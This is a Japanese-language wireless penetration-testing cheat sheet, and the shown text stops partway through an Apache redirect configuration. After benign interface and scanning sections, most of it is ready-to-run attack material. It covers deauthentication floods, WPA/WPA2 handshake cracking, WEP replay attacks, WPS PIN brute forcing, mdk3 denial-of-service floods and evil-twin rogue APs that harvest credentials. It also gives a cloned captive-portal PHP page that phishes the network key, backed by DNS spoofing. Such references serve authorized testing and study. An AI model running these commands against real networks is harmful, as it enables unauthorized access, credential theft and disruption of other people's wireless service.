# ワイヤレスペネトレーションテスト — 完全チートシート

---

## 1. ワイヤレスインターフェース設定とモニターモード

### airmon-ng

```bash
# ワイヤレスインターフェース、ドライバ、チップセットを一覧表示
sudo airmon-ng

# 干渉するプロセスを確認（NetworkManager、wpa_supplicant、dhclient）
sudo airmon-ng check

# 干渉プロセスを正常に終了
sudo airmon-ng check kill

# モニターモードを有効化
sudo airmon-ng start wlan0

# 特定チャンネルでモニターモードを有効化
sudo airmon-ng start wlan0 6

# モニターモードを無効化
sudo airmon-ng stop wlan0mon

# 詳細出力（カーネル情報、VM検出、ドライバソース）
sudo airmon-ng --verbose

# デバッグ出力（システムコマンド、バス情報）
sudo airmon-ng --debug
```

### iw

```bash
# 全ワイヤレス機能を一覧表示（モード、バンド、周波数、MCSレート）
sudo iw list

# インターフェース情報を表示
sudo iw dev wlan0 info

# APをスキャン
sudo iw dev wlan0 scan

# SSIDをフィルタしてスキャン
sudo iw dev wlan0 scan | grep SSID

# SSID + チャンネルを表示
sudo iw dev wlan0 scan | egrep "DS Parameter set|SSID:"

# モニターモードインターフェースを作成
sudo iw dev wlan0 interface add wlan0mon type monitor
sudo ip link set wlan0mon up

# モニターモードインターフェースを削除
sudo iw dev wlan0mon interface del

# チャンネルを設定
sudo iw dev wlan0mon set channel 6

# インターフェース情報（チャンネル、タイプ、送信出力）
sudo iw dev wlan0mon info
```

### iwconfig（レガシー）

```bash
# モニターモードを設定
sudo iwconfig wlan0 mode monitor

# チャンネルを設定
sudo iwconfig wlan0 channel 6

# インターフェース情報を表示
sudo iwconfig wlan0mon
```

### iwlist（レガシー）

```bash
# 利用可能な周波数/チャンネルを一覧表示
sudo iwlist wlan0 frequency

# APをスキャン
sudo iwlist wlan0 scan
```

### ip / ifconfig

```bash
# インターフェースをアップ/ダウン
sudo ip link set wlan0 up
sudo ip link set wlan0 down

# IPアドレスを割り当て
sudo ip addr add 192.168.1.1/24 dev wlan0

# IPアドレスを表示
ip addr show wlan0

# リンク状態を表示
ip link show wlan0
```

### rfkill

```bash
# 全無線（Wi-Fi、Bluetooth等）を一覧表示
sudo rfkill list

# 特定無線をブロック（ソフトブロック）
sudo rfkill block 1

# 特定無線をアンブロック
sudo rfkill unblock 1

# 全無線をブロック
sudo rfkill block all

# 全無線をアンブロック
sudo rfkill unblock all

# 特定無線を一覧表示
sudo rfkill list 1
```

---

## 2. チップセットとドライバの特定

### lsusb

```bash
# USBデバイスを一覧表示
lsusb

# USBデバイス詳細（ベンダーID、プロダクトID、チップセット）
sudo lsusb -vv

# ワイヤレスアダプタでフィルタ
lsusb | grep -i wireless
```

### lspci

```bash
# PCIデバイスを一覧表示
lspci

# 数値ID（ベンダー:デバイス）
lspci -n

# PCI詳細
lspci -vv
```

### dmesg

```bash
# カーネルメッセージを表示（ドライバ読み込み、エラー、ファームウェア）
sudo dmesg

# ワイヤレス関連メッセージでフィルタ
sudo dmesg | egrep "ieee80211|mac80211|cfg80211|wifi|wireless"

# カーネルメッセージをフォロー（デバイスを挿して出力を監視）
sudo dmesg -w
```

### lsmod

```bash
# ロード済みカーネルモジュールを一覧表示
lsmod

# ワイヤレスモジュールでフィルタ
lsmod | grep -i "ath\|rtl\|iwl\|brcm\|mt76"

# モジュールの依存関係を表示
lsmod | grep ath9k
```

### modinfo

```bash
# ドライバ情報を表示（ファイル名、ファームウェア、依存関係、パラメータ）
sudo modinfo ath9k_htc

# ドライバパラメータのみ表示
sudo modinfo ath9k_htc | grep parm
```

### modprobe / insmod / rmmod

```bash
# パラメータ付きでモジュールをロード
sudo modprobe ath9k_htc blink=0

# 特定パスからモジュールをロード
sudo insmod /path/to/driver.ko

# モジュールを削除（依存モジュールを先に削除する必要あり）
sudo rmmod ath9k_htc ath9k_common ath9k_hw ath

# ロード前にモジュールパラメータを確認
sudo modinfo ath9k_htc
```

### FCC ID検索

```bash
# デバイスラベルでFCC IDを探す
# fcc.gov/oet/ea/fccid で検索
# 内部写真を閲覧してチップセットを特定
# チップセットメーカーとモデル番号が表示されることが多い
```

### Windowsドライバ抽出

```bash
# UniExtract2で.exe/.msiドライバパッケージを展開
# .infファイル（UTF-16）でサポートIDを確認
# ファイル名（.cat、.inf、.sys）がチップセットのコードネームを示す場合あり
```

### DeviWiki / WikiDevi

```bash
# 検索: "<カードモデル> wikidevi"
# 例: https://deviwiki.com/wiki/ALFA_Network_AWUS036AC
# チップセット（RTL8812AU）、USB ID（0bda:8812）、Linuxドライバを表示
```

---

## 3. 規制ドメインとRF制御

### iw reg

```bash
# 現在の規制ドメインを取得
sudo iw reg get

# 規制ドメインを設定（US、GB、JP等）
sudo iw reg set US

# PHYごとの規制ドメインを表示
sudo iw reg get | grep -A5 "phy#"
```

### CRDA設定

```bash
# 再起動後も規制ドメインを保持
sudo nano /etc/default/crda
# REGDOMAIN=US を設定

# 再起動後に確認
sudo iw reg get
```

### チャンネル/周波数リファレンス

```bash
# 2.4 GHz: チャンネル1-14、各20 MHz、非重複は1/6/11のみ
# 5 GHz: チャンネル36-165、20/40/80/160 MHz
# 6 GHz: チャンネル1-233（Wi-Fi 6E）
# 60 GHz: チャンネル1-6、各2.16 GHz（802.11ad/WiGig）

# 中心周波数（2.4 GHz）:
# Ch 1: 2412 MHz、Ch 6: 2437 MHz、Ch 11: 2462 MHz、Ch 14: 2484 MHz

# HT40+（プライマリ + 4）: Ch 1+5、2+6、3+7、4+8、5+9、6+10、7+11
# HT40-（プライマリ - 4）: Ch 5-1、6-2、7-3、8-4、9-5、10-6、11-7
```

---

## 4. 偵察とスキャン

### airodump-ng

```bash
# 基本スキャン（チャンネルホッピング）
sudo airodump-ng wlan0mon

# 特定チャンネルをスキャン
sudo airodump-ng -c 6 wlan0mon

# 特定チャンネル、ファイルに書き込み
sudo airodump-ng -c 6 -w capture wlan0mon

# 特定BSSIDをターゲット
sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 wlan0mon

# ESSIDでフィルタ
sudo airodump-ng --essid "TargetNet" -c 6 wlan0mon

# WPS情報を表示
sudo airodump-ng --wps wlan0mon

# 出力フォーマット（csv、pcap、kismet、netxml、logcsv）
sudo airodump-ng --output-format csv,pcap wlan0mon

# 5 GHzのみ表示
sudo airodump-ng --band a wlan0mon

# 両バンド表示
sudo airodump-ng --band abg wlan0mon

# インタラクティブキー:
#   a = 表示切り替え（AP+ステーション、APのみ、ステーションのみ）
#   s = ソート切り替え（ビーコン、データ、レート、チャンネル等）
#   i = ソート反転
#   d = ソートリセット
#   m = 選択APの色を切り替え
#   A = スクロール切り替え
#   J/L = スクロール時の上下
#   T = 表示をフリーズ
#   C+c = 終了
```

### wash

```bash
# WPS対応APをスキャン（2.4 GHz）
sudo wash -i wlan0mon

# 5 GHzをスキャン
sudo wash -i wlan0mon -5

# 全て表示（ロック含む）
sudo wash -i wlan0mon -a

# ロックのみ表示
sudo wash -i wlan0mon -l

# FCSエラーを無視
sudo wash -i wlan0mon -n
```

### Kismet（スキャン）

```bash
# wlan0でKismetを起動（自動モニターモード）
sudo kismet -c wlan0

# ncursesなし（全出力、スクロール可能）
sudo kismet -c wlan0 --no-ncurses

# チャンネル制限
sudo kismet -c wlan0:channels="1,6,11"

# デーモン化
sudo kismet --daemonize

# サービスとして実行
sudo systemctl start kismet
```

---

## 5. パケットキャプチャと分析

### tcpdump

```bash
# モニターインターフェースでキャプチャ
sudo tcpdump -i wlan0mon

# 生パケットをstdoutに書き込み（パイプ用）
sudo tcpdump -i wlan0mon -w - -U

# リンクタイプ付きでキャプチャ
sudo tcpdump -i wlan0mon -w capture.pcap

# 特定BSSIDをキャプチャ（全アドレスフィールドでフィルタ）
sudo tcpdump -i wlan0mon 'wlan addr1 00:11:22:33:44:55 or wlan addr2 00:11:22:33:44:55'

# ビーコンを除外
sudo tcpdump -i wlan0mon 'not subtype beacon'

# コントロールフレームを除外
sudo tcpdump -i wlan0mon 'not type ctl'

# 802.11ヘッダを表示
sudo tcpdump -i wlan0mon -e -s 0 -vvv
```

### Wireshark — 表示フィルタ

```
# 802.11フレームタイプ
wlan.fc.type == 0      # 管理
wlan.fc.type == 1      # 制御
wlan.fc.type == 2      # データ
wlan.fc.type == 3      # 拡張

# 管理サブタイプ
wlan.fc.type_subtype == 0x08   # ビーコン
wlan.fc.type_subtype == 0x04   # プローブリクエスト
wlan.fc.type_subtype == 0x05   # プローブレスポンス
wlan.fc.type_subtype == 0x0b   # 認証
wlan.fc.type_subtype == 0x00   # アソシエーションリクエスト
wlan.fc.type_subtype == 0x01   # アソシエーションレスポンス
wlan.fc.type_subtype == 0x0c   # 認証解除
wlan.fc.type_subtype == 0x0a   # ディスアソシエーション

# 制御サブタイプ
wlan.fc.type_subtype == 0x0d   # ACK
wlan.fc.type_subtype == 0x0b   # RTS
wlan.fc.type_subtype == 0x0c   # CTS

# データサブタイプ
wlan.fc.type_subtype == 0x00   # データ
wlan.fc.type_subtype == 0x08   # QoSデータ
wlan.fc.type_subtype == 0x04   # Null

# 特定フィールド
wlan.bssid == 00:11:22:33:44:55
wlan.ssid == "TargetNet"
wlan.fc.protected == 1          # 暗号化フレーム
wlan.fc.retry == 1              # 再送信
wlan.fc.ds == 0x01              # ToDS
wlan.fc.ds == 0x02              # FromDS
wlan.fc.ds == 0x03              # WDS
eapol                            # EAPoLフレーム
wlan.fc.type_subtype in {0x0 0x1 0xb}  # アソシエーション req/resp + 認証

# プロトコルフィルタ
eapol
eap
tls
http
dns
dhcp
```

### Wireshark — キャプチャフィルタ

```
# ビーコンを除外
not subtype beacon

# コントロールフレームを除外
not type ctl

# プローブリクエスト/レスポンスを除外
not subtype probe-req and not subtype probe-resp

# 特定デバイス（全4アドレスフィールド）
(wlan addr1 AA:BB:CC:DD:EE:FF) or (wlan addr2 AA:BB:CC:DD:EE:FF) or (wlan addr3 AA:BB:CC:DD:EE:FF) or (wlan addr4 AA:BB:CC:DD:EE:FF)

# 複合フィルタ
((wlan addr1 AA:BB:CC:DD:EE:FF) or (wlan addr2 AA:BB:CC:DD:EE:FF)) and not subtype beacon and not type ctl

# ビーコンのみ
subtype beacon

# プローブ
subtype probe-req or subtype probe-resp

# アソシエーション
subtype assoc-req or subtype assoc-resp or subtype reassoc-req or subtype reassoc-resp

# データ
type data
```

### Wireshark — コマンドライン

```bash
# インターフェースを一覧表示
wireshark -D

# wlan0monでキャプチャ、即時開始
sudo wireshark -i wlan0mon -k

# モニターモード + 即時キャプチャ
sudo wireshark -i wlan0 -I -k

# フィルタ付きでキャプチャ
sudo wireshark -i wlan0mon -k -f "not subtype beacon"

# スナップレン（最初の60バイトをキャプチャ）
sudo wireshark -i wlan0mon -k -s 60

# キャプチャファイルを開く
wireshark capture.pcap

# tcpdumpをWiresharkにパイプ（名前なしパイプ）
sudo tcpdump -U -w - -i wlan0mon | wireshark -k -i -

# 名前付きパイプ
mkfifo /tmp/named_pipe
sudo wireshark -k -i /tmp/named_pipe
sudo tcpdump -U -w - -i wlan0mon > /tmp/named_pipe

# SSH経由のリモートキャプチャ（パイプ）
ssh root@10.0.0.1 "sudo tcpdump -U -w - -i wlan0mon" | wireshark -k -i -

# SSHdump経由のリモートキャプチャ（GUI）
# Capture > Options > SSH remote capture
# サーバー、ポート、認証、リモートインターフェース、キャプチャコマンドを設定
```

### tshark

```bash
# ファイルにキャプチャ
sudo tshark -w - -i wlan0mon

# PcapNgをPcapに変換
tshark -F pcap -r input.pcapng -w output.pcap

# 表示フィルタ
tshark -r capture.pcap -Y "wlan.fc.type_subtype == 0x08"

# キャプチャを読む
tshark -r capture.pcap
```

### dumpcap

```bash
# stdoutにキャプチャ（PCAP形式）
sudo dumpcap -w - -P -i wlan0mon

# ファイルにキャプチャ
sudo dumpcap -i wlan0mon -w capture.pcap
```

### Wireshark復号

```
# WEPキー
# Preferences > Protocols > IEEE 802.11 > Edit decryption keys
# Key type: wep
# Key: 16進数（例: 1A:2B:3C:4D:5E）
# Key ID: 0-3

# WPA-PSK（パスフレーズ + SSID）
# Key type: wpa-pwd
# Key: パスフレーズ:SSID（例: password123:MyNetwork）

# WPA-PSK（PMK 16進数）
# Key type: wpa-psk
# Key: PMK 16進数（64文字）

# wpa_passphraseでPMKを生成
wpa_passphrase MyNetwork "password123"
# psk= の値をWiresharkのwpa-pskキーとしてコピー
```

---

## 6. WPA/WPA2ハンドシェイクのキャプチャとクラッキング

### airodump-ng（キャプチャ）

```bash
# ターゲットチャンネルでキャプチャ開始、ファイルに書き込み
sudo airodump-ng -c 6 -w capture --bssid 00:11:22:33:44:55 wlan0mon

# ESSIDでフィルタ
sudo airodump-ng -c 6 -w capture --essid "TargetNet" --bssid 00:11:22:33:44:55 wlan0mon

# WPAハンドシェイクキャプチャメッセージが最上行に表示:
# [ WPA handshake: 00:11:22:33:44:55 ]
```

### aireplay-ng（ハンドシェイク強制のためのDeauth）

```bash
# 1クライアントをDeauth
sudo aireplay-ng -0 1 -a 00:11:22:33:44:55 -c 00:AA:BB:CC:DD:EE wlan0mon

# 全クライアントをDeauth（ブロードキャスト）
sudo aireplay-ng -0 1 -a 00:11:22:33:44:55 wlan0mon

# 継続的Deauth（1秒ごと）
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon

# インジェクションテスト
sudo aireplay-ng -9 wlan0mon

# 特定APに対するインジェクションテスト
sudo aireplay-ng -9 -e "TargetNet" -a 00:11:22:33:44:55 wlan0mon

# カード間インジェクションテスト
sudo aireplay-ng -9 -i wlan1mon wlan0mon
```

### aircrack-ng

```bash
# ワードリストでクラック
aircrack-ng -w /usr/share/john/password.lst -e "TargetNet" -b 00:11:22:33:44:55 capture-01.cap

# ESSID/BSSIDなし（ネットワーク選択を促す）
aircrack-ng -w wordlist.txt capture-01.cap

# CPUベンチマーク
aircrack-ng -S

# airolib-ngデータベースを使用
aircrack-ng -r database.sqlite capture-01.cap

# John the Ripperからパイプ
john --wordlist=password.lst --rules --stdout | aircrack-ng -e "TargetNet" -w - capture-01.cap

# Crunchからパイプ
crunch 11 11 -t password%%% | aircrack-ng -e "TargetNet" -w - capture-01.cap

# RSManglerからパイプ
rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e "TargetNet" -w - capture-01.cap
```

### airdecap-ng

```bash
# WPAキャプチャを復号
airdecap-ng -b 00:11:22:33:44:55 -e "TargetNet" -p "password123" capture-01.cap

# WEPキャプチャを復号
airdecap-ng -w 1A:2B:3C:4D:5E capture-01.cap

# オープンネットワークキャプチャからワイヤレスヘッダを除去
airdecap-ng -b 00:11:22:33:44:55 opennet-01.cap

# 出力ファイル: capture-01-dec.cap
```

### airgraph-ng

```bash
# OUIデータベースをダウンロード
mkdir support && cd support
wget http://standards-oui.ieee.org/oui.txt
cd ..

# クライアント-AP関係グラフ
airgraph-ng -o capr.png -i dump-01.csv -g CAPR

# クライアントプローブグラフ
airgraph-ng -o cpg.png -i dump-01.csv -g CPG
```

### airolib-ng

```bash
# ESSIDファイルを作成
echo "TargetNet" > essid.txt

# データベースにESSIDをインポート
airolib-ng target.sqlite --import essid essid.txt

# パスワードリストをインポート
airolib-ng target.sqlite --import passwd /usr/share/john/password.lst

# データベース統計を表示
airolib-ng target.sqlite --stats

# PMKをバッチ計算
airolib-ng target.sqlite --batch

# aircrack-ngでデータベースを使用
aircrack-ng -r target.sqlite capture-01.cap

# バッチ処理（バックグラウンド）
airolib-ng target.sqlite --batch &

# 複数ESSIDをインポート
echo "Net1" > essid1.txt
echo "Net2" > essid2.txt
airolib-ng db.sqlite --import essid essid1.txt
airolib-ng db.sqlite --import essid essid2.txt
```

### coWPAtty

```bash
# 辞書攻撃
cowpatty -r capture-01.cap -d /usr/share/john/password.lst -s "TargetNet"

# 事前計算ハッシュ（レインボーテーブル）を生成
genpmk -f /usr/share/john/password.lst -d wifuhashes -s "TargetNet"

# 事前計算ハッシュを使用
cowpatty -r capture-01.cap -d wifuhashes -s "TargetNet"
```

### hashcat（WPA）

```bash
# PCAPをhccapxに変換（レガシー2500モード）
/usr/lib/hashcat-utils/cap2hccapx.bin capture-01.cap output.hccapx

# hashcatでクラック（2500モード、非推奨）
hashcat -m 2500 --deprecated-check-disable output.hccapx /usr/share/john/password.lst

# hcxtoolsで22000モードに変換
hcxpcapngtool -o hash.hc22000 capture-01.cap

# hashcatでクラック（22000モード）
hashcat -a 0 -m 22000 hash.hc22000 /usr/share/john/password.lst

# 22000モードのベンチマーク
hashcat -b -m 22000

# 2500モードのベンチマーク
hashcat -b -m 2500

# デバイス一覧
hashcat -I

# デバイス指定
hashcat -d 1 -m 22000 hash.hc22000 wordlist.txt

# デバイスタイプ指定（CPU/GPU）
hashcat -D 2 -m 22000 hash.hc22000 wordlist.txt

# セッション管理
hashcat --session mysession -m 22000 hash.hc22000 wordlist.txt
hashcat --session mysession --restore

# ポットファイル
cat ~/.hashcat/hashcat.potfile
rm ~/.hashcat/hashcat.potfile
```

### hcxtools

```bash
# インストール
sudo apt install hcxtools

# pcapを22000に変換
hcxpcapngtool -o hash.hc22000 capture.pcap

# フィルタ付きで変換
hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcap

# キャプチャ情報を表示
hcxpcapngtool capture.pcap
```

---

## 7. WEPクラッキング

### airodump-ng（WEPキャプチャ）

```bash
# WEP IVをキャプチャ（ファイルに書き込み）
sudo airodump-ng -c 6 -w wep_capture --bssid 00:11:22:33:44:55 wlan0mon

# IVのみ書き込み（小さいファイル）
sudo airodump-ng -c 6 -w wep_capture --bssid 00:11:22:33:44:55 --ivs wlan0mon
```

### aireplay-ng（WEP攻撃）

```bash
# 偽認証（APにアソシエート）
sudo aireplay-ng -1 0 -e "TargetNet" -a 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# キープアライブ付き偽認証（60秒ごと）
sudo aireplay-ng -1 60 -e "TargetNet" -a 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# ARPリクエストリプレイ攻撃（IVを生成）
sudo aireplay-ng -3 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# インタラクティブパケットリプレイ
sudo aireplay-ng -2 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# KoreK ChopChop攻撃
sudo aireplay-ng -4 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# フラグメンテーション攻撃
sudo aireplay-ng -5 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# カフェラテ攻撃
sudo aireplay-ng -6 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# クライアント指向フラグメンテーション攻撃
sudo aireplay-ng -7 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon

# WPAマイグレーションモード攻撃
sudo aireplay-ng -8 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon
```

### aircrack-ng（WEP）

```bash
# WEPをクラック（約50k-200k IVが必要）
aircrack-ng wep_capture-01.cap

# BSSIDを指定
aircrack-ng -b 00:11:22:33:44:55 wep_capture-01.cap

# PTW攻撃を使用（高速、少ないIV）
aircrack-ng -z wep_capture-01.cap

# KoreK攻撃を使用
aircrack-ng -K wep_capture-01.cap

# FMS攻撃を使用
aircrack-ng -f 2 wep_capture-01.cap
```

### airdecap-ng（WEP）

```bash
# WEPキャプチャを復号（キーは16進数）
airdecap-ng -w 1A:2B:3C:4D:5E wep_capture-01.cap
```

---

## 8. WPS攻撃

### wash

```bash
# WPS APをスキャン
sudo wash -i wlan0mon

# ロックを表示
sudo wash -i wlan0mon -l

# 全て表示（ロック含む）
sudo wash -i wlan0mon -a

# 5 GHz
sudo wash -i wlan0mon -5
```

### reaver

```bash
# WPS PINをブルートフォース
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -v

# チャンネル指定
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -c 6 -v

# PixieWPS攻撃（オフラインPIN回復）
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -v -K

# 特定PINを試す
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -p 12345670

# 空のPIN
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -p ''

# 試行間の遅延（ロックアウト回避）
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -d 15 -T 5

# 前回のセッションを復元
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -s session_file

# 冗長レベル
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -v   # 冗長
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -vv  # 非常に冗長

# フレームチェックサムエラーを無視
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -C

# MACアドレスを設定
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -m 00:AA:BB:CC:DD:EE

# 特定WPSバージョンを使用
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -w 2
```

### bully

```bash
# WPS PINをブルートフォース
sudo bully -b 00:11:22:33:44:55 wlan0mon

# PixieWPS攻撃
sudo bully -b 00:11:22:33:44:55 -d wlan0mon

# 詳細出力
sudo bully -b 00:11:22:33:44:55 -v 4 wlan0mon

# 特定PINを試す
sudo bully -b 00:11:22:33:44:55 -B -p 12345670 wlan0mon

# チャンネル指定
sudo bully -b 00:11:22:33:44:55 -c 6 wlan0mon
```

### pixiewps

```bash
# スタンドアロン（reaver/bully出力の値）
pixiewps -e <Enonce> -s <SNonce> -z <ES1> -a <ES2> -n <N1> -r <R1>

# 通常はreaver/bullyが-K/-dで自動呼び出し
```

### 既知PINデータベース

```bash
# airgeddonをインストール
sudo apt install airgeddon

# 既知PINデータベースをソース
source /usr/share/airgeddon/known_pins.db

# BSSIDプレフィックス（最初の3バイト、大文字）で検索
echo ${PINDB["0013F7"]}
```

### mdk3 / mdk4

```bash
# 認証DoS
sudo mdk3 wlan0mon a -a 00:11:22:33:44:55

# EAPOL Start DoS
sudo mdk3 wlan0mon e -t 00:11:22:33:44:55 -n 00:AA:BB:CC:DD:EE

# EAPOLログオフフラッド
sudo mdk3 wlan0mon l -t 00:11:22:33:44:55

# Deauth DoS
sudo mdk3 wlan0mon d -b blacklist.txt -c 6

# ビーコンフラッド
sudo mdk3 wlan0mon b -f ssid_list.txt -c 6 -s 1000

# WIDS/WIPS混乱
sudo mdk3 wlan0mon w -e "TargetNet" -c 6
```

### WPSロックバイパス

```bash
# mdk3でAPをクラッシュさせる（再起動でロック解除）
sudo mdk3 wlan0mon a -a 00:11:22:33:44:55

# または全クライアントをDeauth
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon
```

---

## 9. ローグアクセスポイント

### hostapd-mana

```bash
# インストール
sudo apt install hostapd-mana

# 設定ファイル（基本）
cat > rogue.conf << 'EOF'
interface=wlan0
ssid=TargetNet
channel=6
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/handshakes.hccapx
EOF

# ローグAPを起動
sudo hostapd-mana rogue.conf

# クライアントからハンドシェイクをキャプチャ
sudo hostapd-mana Mostar-mana.conf
```

### hostapd（標準）

```bash
# インストール
sudo apt install hostapd

# 設定ファイル（WPA2 PSK）
cat > hostapd.conf << 'EOF'
interface=wlan0
ssid=BTTF
channel=11
hw_mode=g
ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=GreatScott
EOF

# APを起動
sudo hostapd hostapd.conf

# バックグラウンドで実行
sudo hostapd -B hostapd.conf
```

### hostapd-mana（エンタープライズ）

```bash
# インストール
sudo apt install hostapd-mana freeradius

# 証明書を生成
cd /etc/freeradius/3.0/certs
sudo nano ca.cnf     # certificate_authorityフィールドを編集
sudo nano server.cnf  # serverフィールドを編集
sudo rm dh
sudo make

# EAPユーザーファイルを作成
cat > /etc/hostapd-mana/mana.eap_user << 'EOF'
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
EOF

# hostapd-mana設定を作成
cat > /etc/hostapd-mana/mana.conf << 'EOF'
ssid=Playtronics
interface=wlan0
driver=nl80211
channel=1
hw_mode=g
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0
eap_user_file=/etc/hostapd-mana/mana.eap_user
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh
auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
mana_wpe=1
mana_credout=/tmp/hostapd.credout
mana_eapsuccess=1
mana_eaptls=1
EOF

# 起動
sudo hostapd-mana /etc/hostapd-mana/mana.conf

# バックグラウンドで実行
sudo hostapd-mana -B /etc/hostapd-mana/mana.conf
```

### ローグAPでのハンドシェイクキャプチャ

```bash
# ターミナル1: ローグAPを起動（hostapd-mana）
sudo hostapd-mana Mostar-mana.conf

# ターミナル2: 正規APからクライアントをDeauth
sudo airmon-ng start wlan1 6
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan1mon

# ハンドシェイクはmana_wpaoutファイルに保存
```

### 変換とクラック

```bash
# フォーマットを確認
cat mostar.hccapx

# プレフィックスを除去（hostapd-manaが追加する場合）
sed 's/^\[WPA2-EAPOL HASHCAT\][[:space:]]*//' mostar.hccapx > mostar.22000

# 確認
head mostar.22000

# hashcatでクラック
hashcat -m 22000 mostar.22000 /usr/share/john/password.lst
```

---

## 10. キャプティブポータル攻撃

### Apache + PHPセットアップ

```bash
# インストール
sudo apt install apache2 libapache2-mod-php

# ポータルディレクトリを作成
sudo mkdir -p /var/www/html/portal

# ターゲットWebサイトをダウンロード
wget -r -l2 https://www.target.com

# アセットをコピー
sudo cp -r ./www.target.com/assets/ /var/www/html/portal/
sudo cp -r ./www.target.com/old-site/ /var/www/html/portal/
```

### キャプティブポータル — index.php

```php
<!DOCTYPE html>
<html>
<head>
  <link href="assets/css/style.css" rel="stylesheet">
  <title>Target Corp - WiFi</title>
</head>
<body>
  <div class="navbar">
    <a class="navbar-brand" href="index.php">Target Corp</a>
  </div>
  <div id="headerwrap">
    <div class="row centered">
      <div class="col-lg-8 col-lg-offset-2">
        <?php
          if (isset($_GET["success"])) {
            echo '<h3>Login successful</h3>';
            echo '<h3>You may close this page</h3>';
          } else {
            if (isset($_GET["failure"])) {
              echo '<h3>Invalid network key, try again</h3><br/><br/>';
            }
        ?>
        <h3>Enter network key</h3><br/><br/>
        <form action="login_check.php" method="post">
          <input type="password" id="passphrase" name="passphrase"><br/><br/>
          <input type="submit" value="Connect"/>
        </form>
        <?php } ?>
      </div>
    </div>
  </div>
</body>
</html>
```

### キャプティブポータル — login_check.php

```php
<?php
$handshake_path = '/home/kali/discovery-01.cap';
$essid = 'MegaCorp One Lab';
$success_path = '/tmp/passphrase.txt';
$passphrase = $_POST['passphrase'];

if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

$correct_pass = file_get_contents($success_path);
if ($correct_pass !== FALSE) {
  if ($correct_pass == $passphrase) {
    header('Location: index.php?success');
  } else {
    header('Location: index.php?failure');
  }
  die();
}

$wordlist_path = tempnam('/tmp', 'wordlist');
$wordlist_file = fopen($wordlist_path, "w");
fwrite($wordlist_file, $passphrase);
fclose($wordlist_file);

exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);

$key_found = FALSE;
if ($retval == 0) {
  foreach($output as $line) {
    if (strpos($line, "KEY FOUND") !== FALSE) {
      $key_found = TRUE;
      break;
    }
  }
}

if ($key_found) {
  @rename($wordlist_path, $success_path);
  header('Location: index.php?success');
} else {
  @unlink($wordlist_file);
  header('Location: index.php?failure');
}
?>
```

### dnsmasq（DHCP + DNSスプーフィング）

```bash
# インストール
sudo apt install dnsmasq

# 設定
cat > mco-dnsmasq.conf << 'EOF'
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
listen-address=192.168.87.1
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100
# DNSスプーフィング
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1
address=/dns.msftncsi.com/131.107.255.255
EOF

# 起動
sudo dnsmasq --conf-file=mco-dnsmasq.conf

# syslogを確認
sudo tail /var/log/syslog | grep dnsmasq

# 待ち受けポートを確認
sudo netstat -lnp | grep dnsmasq
```

### nftables（DNSリダイレクト）

```bash
# インストール
sudo apt install nftables

# DNSを自分にリダイレクト
sudo nft add table ip nat
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```

### Apache mod_rewrite / mod_alias

```bash
# モジュールを有効化
sudo a2enmod rewrite
sudo a2enmod alias
sudo a2enmod ssl

# /etc/apache2/sites-enabled/000-default.conf を編集
# <VirtualHost *:80> 内に追加:

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
